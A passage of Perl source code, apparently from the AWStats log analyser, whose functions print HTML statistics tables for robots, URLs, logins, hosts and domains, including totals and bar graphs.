                        . ${ '_section_' . $extranum . '_p' }{$key} . "</td>";
                }
                if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
                    print "<td>"
                        . ${ '_section_' . $extranum . '_h' }{$key} . "</td>";
                }
                if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
                    print "<td>"
                        . Format_Bytes(
                        ${ '_section_' . $extranum . '_k' }{$key} )
                        . "</td>";
                }
                if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
                    print "<td>"
                        . (
                        ${ '_section_' . $extranum . '_l' }{$key}
                            ? Format_Date(
                            ${ '_section_' . $extranum . '_l' }{$key}, 1 )
                            : '-'
                    )
                        . "</td>";
                }
                print "</tr>\n";
                $count++;
            }

            # If we ask average or sum, we loop on all other records
            if (   $ExtraAddAverageRow[$extranum]
                || $ExtraAddSumRow[$extranum] )
            {
                foreach ( keys %{ '_section_' . $extranum . '_h' } ) {
                    if ( $keysinkeylist{$_} ) { next; }
                    $total_p += ${ '_section_' . $extranum . '_p' }{$_};
                    $total_h += ${ '_section_' . $extranum . '_h' }{$_};
                    $total_k += ${ '_section_' . $extranum . '_k' }{$_};
                    $count++;
                }
            }

            # Add average row
            if ( $ExtraAddAverageRow[$extranum] ) {
                print "<tr>";
                print "<td class=\"aws\"><b>$Message[96]</b></td>";
                if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
                    print "<td>"
                        . ( $count ? Format_Number(( $total_p / $count )) : "&nbsp;" )
                        . "</td>";
                }
                if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
                    print "<td>"
                        . ( $count ? Format_Number(( $total_h / $count )) : "&nbsp;" )
                        . "</td>";
                }
                if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
                    print "<td>"
                        . (
                        $count
                            ? Format_Bytes( $total_k / $count )
                            : "&nbsp;"
                    )
                        . "</td>";
                }
                if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
                    print "<td>&nbsp;</td>";
                }
                print "</tr>\n";
            }

            # Add sum row
            if ( $ExtraAddSumRow[$extranum] ) {
                print "<tr>";
                print "<td class=\"aws\"><b>$Message[102]</b></td>";
                if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
                    print "<td>" . ($total_p) . "</td>";
                }
                if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
                    print "<td>" . ($total_h) . "</td>";
                }
                if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
                    print "<td>" . Format_Bytes($total_k) . "</td>";
                }
                if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
                    print "<td>&nbsp;</td>";
                }
                print "</tr>\n";
            }
            &tab_end();
            &html_end(1);
        }
    }
}

#------------------------------------------------------------------------------
# Function:     Prints the Robot details frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowRobots{
    my $total_p = 0;
    my $total_h = 0;
    my $total_k = 0;
    my $total_r = 0;
    my $rest_p = 0;
    my $rest_h = 0;
    my $rest_k = 0;
    my $rest_r = 0;

    print "$Center<a name=\"robots\">&nbsp;</a><br />\n";
    my $title = '';
    if ( $HTMLOutput{'allrobots'} )  { $title .= "$Message[53]"; }
    if ( $HTMLOutput{'lastrobots'} ) { $title .= "$Message[9]"; }
    &tab_head( "$title", 19, 0, 'robots' );
    print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>"
        . Format_Number(( scalar keys %_robot_h ))
        . " $Message[51]</th>";
    if ( $ShowRobotsStats =~ /H/i ) {
        print
            "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th>";
    }
    if ( $ShowRobotsStats =~ /B/i ) {
        print
            "<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">$Message[75]</th>";
    }
    if ( $ShowRobotsStats =~ /L/i ) {
        print "<th width=\"120\">$Message[9]</th>";
    }
    print "</tr>\n";
    $total_p = $total_h = $total_k = $total_r = 0;
    my $count = 0;
    if ( $HTMLOutput{'allrobots'} ) {
        &BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Robot'},
            \%_robot_h, \%_robot_h );
    }
    if ( $HTMLOutput{'lastrobots'} ) {
        &BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Robot'},
            \%_robot_h, \%_robot_l );
    }
    foreach my $key (@keylist) {
        print "<tr><td class=\"aws\">"
            . ( $RobotsHashIDLib{$key} ? $RobotsHashIDLib{$key} : $key )
            . "</td>";
        if ( $ShowRobotsStats =~ /H/i ) {
            print "<td>"
                . Format_Number(( $_robot_h{$key} - $_robot_r{$key} ))
                . ( $_robot_r{$key} ? "+$_robot_r{$key}" : "" ) . "</td>";
        }
        if ( $ShowRobotsStats =~ /B/i ) {
            print "<td>" . Format_Bytes( $_robot_k{$key} ) . "</td>";
        }
        if ( $ShowRobotsStats =~ /L/i ) {
            print "<td>"
                . (
                $_robot_l{$key}
                    ? Format_Date( $_robot_l{$key}, 1 )
                    : '-'
            )
                . "</td>";
        }
        print "</tr>\n";

        #$total_p += $_robot_p{$key}||0;
        $total_h += $_robot_h{$key};
        $total_k += $_robot_k{$key} || 0;
        $total_r += $_robot_r{$key} || 0;
        $count++;
    }

    # For bots we need to count Totals
    my $TotalPagesRobots =
        0;    #foreach (values %_robot_p) { $TotalPagesRobots+=$_; }
    my $TotalHitsRobots = 0;
    foreach ( values %_robot_h ) { $TotalHitsRobots += $_; }
    my $TotalBytesRobots = 0;
    foreach ( values %_robot_k ) { $TotalBytesRobots += $_; }
    my $TotalRRobots = 0;
    foreach ( values %_robot_r ) { $TotalRRobots += $_; }
    $rest_p = 0;    #$rest_p=$TotalPagesRobots-$total_p;
    $rest_h = $TotalHitsRobots - $total_h;
    $rest_k = $TotalBytesRobots - $total_k;
    $rest_r = $TotalRRobots - $total_r;

    if ($Debug) {
        debug(
            "Total real / shown : $TotalPagesRobots / $total_p - $TotalHitsRobots / $total_h - $TotalBytesRobots / $total_k",
            2
        );
    }
    if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 || $rest_r > 0 )
    {               # All other robots
        print
            "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
        if ( $ShowRobotsStats =~ /H/i ) { print "<td>".Format_Number($rest_h)."</td>"; }
        if ( $ShowRobotsStats =~ /B/i ) {
            print "<td>" . ( Format_Bytes($rest_k) ) . "</td>";
        }
        if ( $ShowRobotsStats =~ /L/i ) { print "<td>&nbsp;</td>"; }
        print "</tr>\n";
    }
    &tab_end(
        "* $Message[156]" . ( $TotalRRobots ? " $Message[157]" : "" ) );
    &html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the URL, Entry or Exit details frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowURLDetail{
    my $total_p = 0;
    my $total_e = 0;
    my $total_k = 0;
    my $total_x = 0;
    # Call to plugins' function ShowPagesFilter
    foreach
    my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesFilter'} } )
    {
        my $function = "ShowPagesFilter_$pluginname";
        &$function();
    }
    print "$Center<a name=\"urls\">&nbsp;</a><br />\n";

    # Show filter form
    &HTMLShowFormFilter( "urlfilter", $FilterIn{'url'}, $FilterEx{'url'} );

    # Show URL list
    my $title = '';
    my $cpt   = 0;
    if ( $HTMLOutput{'urldetail'} ) {
        $title = $Message[19];
        $cpt   = ( scalar keys %_url_p );
    }
    if ( $HTMLOutput{'urlentry'} ) {
        $title = $Message[104];
        $cpt   = ( scalar keys %_url_e );
    }
    if ( $HTMLOutput{'urlexit'} ) {
        $title = $Message[116];
        $cpt   = ( scalar keys %_url_x );
    }
    &tab_head( "$title", 19, 0, 'urls' );
    print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>";
    if ( $FilterIn{'url'} || $FilterEx{'url'} ) {
        if ( $FilterIn{'url'} ) {
            print "$Message[79] <b>$FilterIn{'url'}</b>";
        }
        if ( $FilterIn{'url'} && $FilterEx{'url'} ) { print " - "; }
        if ( $FilterEx{'url'} ) {
            print "Exclude $Message[79] <b>$FilterEx{'url'}</b>";
        }
        if ( $FilterIn{'url'} || $FilterEx{'url'} ) { print ": "; }
        print Format_Number($cpt)." $Message[28]";
        if ( $MonthRequired ne 'all' ) {
            if ( $HTMLOutput{'urldetail'} ) {
                print
                    "<br />$Message[102]: ".Format_Number($TotalDifferentPages)." $Message[28]";
            }
        }
    }
    else { print "$Message[102]: ".Format_Number($cpt)." $Message[28]"; }
    print "</th>";
    if ( $ShowPagesStats =~ /P/i ) {
        print
            "<th bgcolor=\"#$color_p\" width=\"80\">$Message[29]</th>";
    }
    if ( $ShowPagesStats =~ /B/i ) {
        print
            "<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">$Message[106]</th>";
    }
    if ( $ShowPagesStats =~ /E/i ) {
        print
            "<th bgcolor=\"#$color_e\" width=\"80\">$Message[104]</th>";
    }
    if ( $ShowPagesStats =~ /X/i ) {
        print
            "<th bgcolor=\"#$color_x\" width=\"80\">$Message[116]</th>";
    }

    # Call to plugins' function ShowPagesAddField
    foreach
    my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
    {

        #    			my $function="ShowPagesAddField_$pluginname('title')";
        #    			eval("$function");
        my $function = "ShowPagesAddField_$pluginname";
        &$function('title');
    }
    print "<th>&nbsp;</th></tr>\n";
    $total_p = $total_k = $total_e = $total_x = 0;
    my $count = 0;
    if ( $HTMLOutput{'urlentry'} ) {
        &BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \%_url_e,
            \%_url_e );
    }
    elsif ( $HTMLOutput{'urlexit'} ) {
        &BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \%_url_x,
            \%_url_x );
    }
    else {
        &BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \%_url_p,
            \%_url_p );
    }
    my $max_p = 1;
    my $max_k = 1;
    foreach my $key (@keylist) {
        if ( $_url_p{$key} > $max_p ) { $max_p = $_url_p{$key}; }
        if ( $_url_k{$key} / ( $_url_p{$key} || 1 ) > $max_k ) {
            $max_k = $_url_k{$key} / ( $_url_p{$key} || 1 );
        }
    }
    foreach my $key (@keylist) {
        print "<tr><td class=\"aws\">";
        &HTMLShowURLInfo($key);
        print "</td>";
        my $bredde_p = 0;
        my $bredde_e = 0;
        my $bredde_x = 0;
        my $bredde_k = 0;
        if ( $max_p > 0 ) {
            $bredde_p =
                int( $BarWidth * ( $_url_p{$key} || 0 ) / $max_p ) + 1;
        }
        if ( ( $bredde_p == 1 ) && $_url_p{$key} ) { $bredde_p = 2; }
        if ( $max_p > 0 ) {
            $bredde_e =
                int( $BarWidth * ( $_url_e{$key} || 0 ) / $max_p ) + 1;
        }
        if ( ( $bredde_e == 1 ) && $_url_e{$key} ) { $bredde_e = 2; }
        if ( $max_p > 0 ) {
            $bredde_x =
                int( $BarWidth * ( $_url_x{$key} || 0 ) / $max_p ) + 1;
        }
        if ( ( $bredde_x == 1 ) && $_url_x{$key} ) { $bredde_x = 2; }
        if ( $max_k > 0 ) {
            $bredde_k =
                int( $BarWidth *
                    ( ( $_url_k{$key} || 0 ) / ( $_url_p{$key} || 1 ) ) /
                    $max_k ) + 1;
        }
        if ( ( $bredde_k == 1 ) && $_url_k{$key} ) { $bredde_k = 2; }
        if ( $ShowPagesStats =~ /P/i ) {
            print "<td>".Format_Number($_url_p{$key})."</td>";
        }
        if ( $ShowPagesStats =~ /B/i ) {
            print "<td>"
                . (
                $_url_k{$key}
                    ? Format_Bytes(
                    $_url_k{$key} / ( $_url_p{$key} || 1 )
                )
                    : "&nbsp;"
            )
                . "</td>";
        }
        if ( $ShowPagesStats =~ /E/i ) {
            print "<td>"
                . ( $_url_e{$key} ? Format_Number($_url_e{$key}) : "&nbsp;" ) . "</td>";
        }
        if ( $ShowPagesStats =~ /X/i ) {
            print "<td>"
                . ( $_url_x{$key} ? Format_Number($_url_x{$key}) : "&nbsp;" ) . "</td>";
        }

        # Call to plugins' function ShowPagesAddField
        foreach my $pluginname (
            keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
        {

            #    				my $function="ShowPagesAddField_$pluginname('$key')";
            #    				eval("$function");
            my $function = "ShowPagesAddField_$pluginname";
            &$function($key);
        }
        print "<td class=\"aws\">";

        # alt and title are not provided to reduce page size
        if ( $ShowPagesStats =~ /P/i ) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'hp'}\" width=\"$bredde_p\" height=\"4\" /><br />";
        }
        if ( $ShowPagesStats =~ /B/i ) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'hk'}\" width=\"$bredde_k\" height=\"4\" /><br />";
        }
        if ( $ShowPagesStats =~ /E/i ) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'he'}\" width=\"$bredde_e\" height=\"4\" /><br />";
        }
        if ( $ShowPagesStats =~ /X/i ) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'hx'}\" width=\"$bredde_x\" height=\"4\" />";
        }
        print "</td></tr>\n";
        $total_p += $_url_p{$key};
        $total_e += $_url_e{$key};
        $total_x += $_url_x{$key};
        $total_k += $_url_k{$key};
        $count++;
    }
    if ($Debug) {
        debug(
            "Total real / shown : $TotalPages / $total_p - $TotalEntries / $total_e - $TotalExits / $total_x - $TotalBytesPages / $total_k",
            2
        );
    }
    my $rest_p = $TotalPages - $total_p;
    my $rest_k = $TotalBytesPages - $total_k;
    my $rest_e = $TotalEntries - $total_e;
    my $rest_x = $TotalExits - $total_x;
    if ( $rest_p > 0 || $rest_e > 0 || $rest_k > 0 ) {
        print
            "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
        if ( $ShowPagesStats =~ /P/i ) {
            print "<td>" . ( $rest_p ? Format_Number($rest_p) : "&nbsp;" ) . "</td>";
        }
        if ( $ShowPagesStats =~ /B/i ) {
            print "<td>"
                . (
                $rest_k
                    ? Format_Bytes( $rest_k / ( $rest_p || 1 ) )
                    : "&nbsp;"
            )
                . "</td>";
        }
        if ( $ShowPagesStats =~ /E/i ) {
            print "<td>" . ( $rest_e ? Format_Number($rest_e) : "&nbsp;" ) . "</td>";
        }
        if ( $ShowPagesStats =~ /X/i ) {
            print "<td>" . ( $rest_x ? Format_Number($rest_x) : "&nbsp;" ) . "</td>";
        }

        # Call to plugins' function ShowPagesAddField
        foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
        {
            my $function = "ShowPagesAddField_$pluginname";
            &$function('');
        }
        print "<td>&nbsp;</td></tr>\n";
    }
    &tab_end();
    &html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Login details frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowLogins{
    my $total_p = 0;
    my $total_h = 0;
    my $total_k = 0;
    my $rest_p = 0;
    my $rest_h = 0;
    my $rest_k = 0;
    print "$Center<a name=\"logins\">&nbsp;</a><br />\n";
    my $title = '';
    if ( $HTMLOutput{'alllogins'} )  { $title .= "$Message[94]"; }
    if ( $HTMLOutput{'lastlogins'} ) { $title .= "$Message[9]"; }
    &tab_head( "$title", 19, 0, 'logins' );
    print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>$Message[94] : "
        . Format_Number(( scalar keys %_login_h )) . "</th>";
    &HTMLShowUserInfo('__title__');
    if ( $ShowAuthenticatedUsers =~ /P/i ) {
        print
            "<th bgcolor=\"#$color_p\" width=\"80\">$Message[56]</th>";
    }
    if ( $ShowAuthenticatedUsers =~ /H/i ) {
        print
            "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th>";
    }
    if ( $ShowAuthenticatedUsers =~ /B/i ) {
        print
            "<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">$Message[75]</th>";
    }
    if ( $ShowAuthenticatedUsers =~ /L/i ) {
        print "<th width=\"120\">$Message[9]</th>";
    }
    print "</tr>\n";
    $total_p = $total_h = $total_k = 0;
    my $count = 0;
    if ( $HTMLOutput{'alllogins'} ) {
        &BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Login'},
            \%_login_h, \%_login_p );
    }
    if ( $HTMLOutput{'lastlogins'} ) {
        &BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Login'},
            \%_login_h, \%_login_l );
    }
    foreach my $key (@keylist) {
        print "<tr><td class=\"aws\">$key</td>";
        &HTMLShowUserInfo($key);
        if ( $ShowAuthenticatedUsers =~ /P/i ) {
            print "<td>"
                . ( $_login_p{$key} ? Format_Number($_login_p{$key}) : "&nbsp;" )
                . "</td>";
        }
        if ( $ShowAuthenticatedUsers =~ /H/i ) {
            print "<td>".Format_Number($_login_h{$key})."</td>";
        }
        if ( $ShowAuthenticatedUsers =~ /B/i ) {
            print "<td>" . Format_Bytes( $_login_k{$key} ) . "</td>";
        }
        if ( $ShowAuthenticatedUsers =~ /L/i ) {
            print "<td>"
                . (
                $_login_l{$key}
                    ? Format_Date( $_login_l{$key}, 1 )
                    : '-'
            )
                . "</td>";
        }
        print "</tr>\n";
        $total_p += $_login_p{$key} || 0;
        $total_h += $_login_h{$key};
        $total_k += $_login_k{$key} || 0;
        $count++;
    }
    if ($Debug) {
        debug(
            "Total real / shown : $TotalPages / $total_p - $TotalHits / $total_h - $TotalBytes / $total_h",
            2
        );
    }
    $rest_p = $TotalPages - $total_p;
    $rest_h = $TotalHits - $total_h;
    $rest_k = $TotalBytes - $total_k;
    if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )
    {    # All other logins and/or anonymous
        print
            "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[125]</span></td>";
        &HTMLShowUserInfo('');
        if ( $ShowAuthenticatedUsers =~ /P/i ) {
            print "<td>" . ( $rest_p ? Format_Number($rest_p) : "&nbsp;" ) . "</td>";
        }
        if ( $ShowAuthenticatedUsers =~ /H/i ) {
            print "<td>".Format_Number($rest_h)."</td>";
        }
        if ( $ShowAuthenticatedUsers =~ /B/i ) {
            print "<td>" . Format_Bytes($rest_k) . "</td>";
        }
        if ( $ShowAuthenticatedUsers =~ /L/i ) {
            print "<td>&nbsp;</td>";
        }
        print "</tr>\n";
    }
    &tab_end();
    &html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Unknown IP/Host details frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowHostsUnknown{
    my $total_p = 0;
    my $total_h = 0;
    my $total_k = 0;
    my $rest_p = 0;
    my $rest_h = 0;
    my $rest_k = 0;
    print "$Center<a name=\"unknownip\">&nbsp;</a><br />\n";
    &tab_head( "$Message[45]", 19, 0, 'unknownwip' );
    print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>"
        . Format_Number(( scalar keys %_host_h ))
        . " $Message[1]</th>";
    &HTMLShowHostInfo('__title__');
    if ( $ShowHostsStats =~ /P/i ) {
        print
            "<th bgcolor=\"#$color_p\" width=\"80\">$Message[56]</th>";
    }
    if ( $ShowHostsStats =~ /H/i ) {
        print
            "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th>";
    }
    if ( $ShowHostsStats =~ /B/i ) {
        print
            "<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">$Message[75]</th>";
    }
    if ( $ShowHostsStats =~ /L/i ) {
        print "<th width=\"120\">$Message[9]</th>";
    }
    print "</tr>\n";
    $total_p = $total_h = $total_k = 0;
    my $count = 0;
    &BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \%_host_h,
        \%_host_p );
    foreach my $key (@keylist) {
        my $host = CleanXSS($key);
        print "<tr><td class=\"aws\">$host</td>";
        &HTMLShowHostInfo($key);
        if ( $ShowHostsStats =~ /P/i ) {
            print "<td>"
                . ( $_host_p{$key} ? Format_Number($_host_p{$key}) : "&nbsp;" )
                . "</td>";
        }
        if ( $ShowHostsStats =~ /H/i ) {
            print "<td>".Format_Number($_host_h{$key})."</td>";
        }
        if ( $ShowHostsStats =~ /B/i ) {
            print "<td>" . Format_Bytes( $_host_k{$key} ) . "</td>";
        }
        if ( $ShowHostsStats =~ /L/i ) {
            print "<td>"
                . (
                $_host_l{$key}
                    ? Format_Date( $_host_l{$key}, 1 )
                    : '-'
            )
                . "</td>";
        }
        print "</tr>\n";
        $total_p += $_host_p{$key};
        $total_h += $_host_h{$key};
        $total_k += $_host_k{$key} || 0;
        $count++;
    }
    if ($Debug) {
        debug(
            "Total real / shown : $TotalPages / $total_p - $TotalHits / $total_h - $TotalBytes / $total_h",
            2
        );
    }
    $rest_p = $TotalPages - $total_p;
    $rest_h = $TotalHits - $total_h;
    $rest_k = $TotalBytes - $total_k;
    if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )
    {    # All other visitors (known or not)
        print
            "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[82]</span></td>";
        &HTMLShowHostInfo('');
        if ( $ShowHostsStats =~ /P/i ) {
            print "<td>" . ( $rest_p ? Format_Number($rest_p) : "&nbsp;" ) . "</td>";
        }
        if ( $ShowHostsStats =~ /H/i ) { print "<td>".Format_Number($rest_h)."</td>"; }
        if ( $ShowHostsStats =~ /B/i ) {
            print "<td>" . Format_Bytes($rest_k) . "</td>";
        }
        if ( $ShowHostsStats =~ /L/i ) { print "<td>&nbsp;</td>"; }
        print "</tr>\n";
    }
    &tab_end();
    &html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Host details frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowHosts{
    my $total_p = 0;
    my $total_h = 0;
    my $total_k = 0;
    my $rest_p = 0;
    my $rest_h = 0;
    my $rest_k = 0;
    print "$Center<a name=\"hosts\">&nbsp;</a><br />\n";

    # Show filter form
    &HTMLShowFormFilter( "hostfilter", $FilterIn{'host'},
        $FilterEx{'host'} );

    # Show hosts list
    my $title = '';
    my $cpt   = 0;
    if ( $HTMLOutput{'allhosts'} ) {
        $title .= "$Message[81]";
        $cpt = ( scalar keys %_host_h );
    }
    if ( $HTMLOutput{'lasthosts'} ) {
        $title .= "$Message[9]";
        $cpt = ( scalar keys %_host_h );
    }
    &tab_head( "$title", 19, 0, 'hosts' );
    print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>";
    if ( $FilterIn{'host'} || $FilterEx{'host'} ) {    # With filter
        if ( $FilterIn{'host'} ) {
            print "$Message[79] '<b>$FilterIn{'host'}</b>'";
        }
        if ( $FilterIn{'host'} && $FilterEx{'host'} ) { print " - "; }
        if ( $FilterEx{'host'} ) {
            print " Exclude $Message[79] '<b>$FilterEx{'host'}</b>'";
        }
        if ( $FilterIn{'host'} || $FilterEx{'host'} ) { print ": "; }
        print "$cpt $Message[81]";
        if ( $MonthRequired ne 'all' ) {
            if ( $HTMLOutput{'allhosts'} || $HTMLOutput{'lasthosts'} ) {
                print
                    "<br />$Message[102]: ".Format_Number($TotalHostsKnown)." $Message[82], ".Format_Number($TotalHostsUnknown)." $Message[1] - ".Format_Number($TotalUnique)." $Message[11]";
            }
        }
    }
    else {    # Without filter
        if ( $MonthRequired ne 'all' ) {
            print
                "$Message[102] : ".Format_Number($TotalHostsKnown)." $Message[82], ".Format_Number($TotalHostsUnknown)." $Message[1] - ".Format_Number($TotalUnique)." $Message[11]";
        }
        else { print "$Message[102] : " . Format_Number(( scalar keys %_host_h )); }
    }
    print "</th>";
    &HTMLShowHostInfo('__title__');
    if ( $ShowHostsStats =~ /P/i ) {
        print
            "<th bgcolor=\"#$color_p\" width=\"80\">$Message[56]</th>";
    }
    if ( $ShowHostsStats =~ /H/i ) {
        print
            "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th>";
    }
    if ( $ShowHostsStats =~ /B/i ) {
        print
            "<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">$Message[75]</th>";
    }
    if ( $ShowHostsStats =~ /L/i ) {
        print "<th width=\"120\">$Message[9]</th>";
    }
    print "</tr>\n";
    $total_p = $total_h = $total_k = 0;
    my $count = 0;
    if ( $HTMLOutput{'allhosts'} ) {
        &BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \%_host_h,
            \%_host_p );
    }
    if ( $HTMLOutput{'lasthosts'} ) {
        &BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \%_host_h,
            \%_host_l );
    }
    my $regipv4=qr/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;

    if ( $DynamicDNSLookup == 2 ) {
        # Use static DNS file
        &Read_DNS_Cache( \%MyDNSTable, "$DNSStaticCacheFile", "", 1 );
    }

    foreach my $key (@keylist) {
        my $host = CleanXSS($key);
        print "<tr><td class=\"aws\">"
            . ( $_robot_l{$key} ? '<b>'  : '' ) . "$host"
            . ( $_robot_l{$key} ? '</b>' : '' );

        if ($DynamicDNSLookup) {
            # Dynamic reverse DNS lookup
            if ($host =~ /$regipv4/o) {
                my $lookupresult=lc(gethostbyaddr(pack("C4",split(/\./,$host)),AF_INET));       # This may be slow
                if (! $lookupresult || $lookupresult =~ /$regipv4/o || ! IsAscii($lookupresult)) {
                    if ( $DynamicDNSLookup == 2 ) {
                        # Check static DNS file
                        $lookupresult = $MyDNSTable{$host};
                        if ($lookupresult) { print " ($lookupresult)"; }
                        else { print ""; }
                    }
                    else { print ""; }
                }
                else { print " ($lookupresult)"; }
            }
        }

        print "</td>";
        &HTMLShowHostInfo($key);
        if ( $ShowHostsStats =~ /P/i ) {
            print "<td>"
                . ( $_host_p{$key} ? Format_Number($_host_p{$key}) : "&nbsp;" )
                . "</td>";
        }
        if ( $ShowHostsStats =~ /H/i ) {
            print "<td>".Format_Number($_host_h{$key})."</td>";
        }
        if ( $ShowHostsStats =~ /B/i ) {
            print "<td>" . Format_Bytes( $_host_k{$key} ) . "</td>";
        }
        if ( $ShowHostsStats =~ /L/i ) {
            print "<td>"
                . (
                $_host_l{$key}
                    ? Format_Date( $_host_l{$key}, 1 )
                    : '-'
            )
                . "</td>";
        }
        print "</tr>\n";
        $total_p += $_host_p{$key};
        $total_h += $_host_h{$key};
        $total_k += $_host_k{$key} || 0;
        $count++;
    }
    if ($Debug) {
        debug(
            "Total real / shown : $TotalPages / $total_p - $TotalHits / $total_h - $TotalBytes / $total_h",
            2
        );
    }
    $rest_p = $TotalPages - $total_p;
    $rest_h = $TotalHits - $total_h;
    $rest_k = $TotalBytes - $total_k;
    if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )
    {    # All other visitors (known or not)
        print
            "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
        &HTMLShowHostInfo('');
        if ( $ShowHostsStats =~ /P/i ) {
            print "<td>" . ( $rest_p ? Format_Number($rest_p) : "&nbsp;" ) . "</td>";
        }
        if ( $ShowHostsStats =~ /H/i ) { print "<td>".Format_Number($rest_h)."</td>"; }
        if ( $ShowHostsStats =~ /B/i ) {
            print "<td>" . Format_Bytes($rest_k) . "</td>";
        }
        if ( $ShowHostsStats =~ /L/i ) { print "<td>&nbsp;</td>"; }
        print "</tr>\n";
    }
    &tab_end();
    &html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Domains details frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowDomains{
    my $total_p = 0;
    my $total_h = 0;
    my $total_k = 0;
    my $total_v = 0;
    my $total_u = 0;
    my $rest_p = 0;
    my $rest_h = 0;
    my $rest_k = 0;
    my $rest_v = 0;
    my $rest_u = 0;
    print "$Center<a name=\"domains\">&nbsp;</a><br />\n";

    # Show domains list
    my $title = '';
    my $cpt   = 0;
    if ( $HTMLOutput{'alldomains'} ) {
        $title .= "$Message[25]";
        $cpt = ( scalar keys %_domener_h );
    }
    &tab_head( "$title", 19, 0, 'domains' );
    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"$WIDTHCOLICON\">&nbsp;</th><th colspan=\"2\">$Message[17]</th>";
    if ( $ShowDomainsStats =~ /U/i ) {
        print
            "<th bgcolor=\"#$color_u\" width=\"80\">$Message[11]</th>";
    }
    if ( $ShowDomainsStats =~ /V/i ) {
        print
            "<th bgcolor=\"#$color_v\" width=\"80\">$Message[10]</th>";
    }
    if ( $ShowDomainsStats =~ /P/i ) {
        print
            "<th bgcolor=\"#$color_p\" width=\"80\">$Message[56]</th>";
    }
    if ( $ShowDomainsStats =~ /H/i ) {
        print
            "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th>";
    }
    if ( $ShowDomainsStats =~ /B/i ) {
        print
            "<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">$Message[75]</th>";
    }
    print "<th>&nbsp;</th>";
    print "</tr>\n";
    $total_u = $total_v = $total_p = $total_h = $total_k = 0;
    my $max_h = 1;
    foreach ( values %_domener_h ) {
        if ( $_ > $max_h ) { $max_h = $_; }
    }
    my $max_k = 1;
    foreach ( values %_domener_k ) {
        if ( $_ > $max_k ) { $max_k = $_; }
    }
    my $count = 0;
    &BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_domener_h,
        \%_domener_p );
    foreach my $key (@keylist) {
        my ( $_domener_u, $_domener_v );
        my $bredde_p = 0;
        my $bredde_h = 0;
        my $bredde_k = 0;
        if ( $max_h > 0 ) {
            $bredde_p =
                int( $BarWidth * $_domener_p{$key} / $max_h ) + 1;
        }    # use max_h to enable to compare pages with hits
        if ( $_domener_p{$key} && $bredde_p == 1 ) { $bredde_p = 2; }
        if ( $max_h > 0 ) {
            $bredde_h =
                int( $BarWidth * $_domener_h{$key} / $max_h ) + 1;
        }
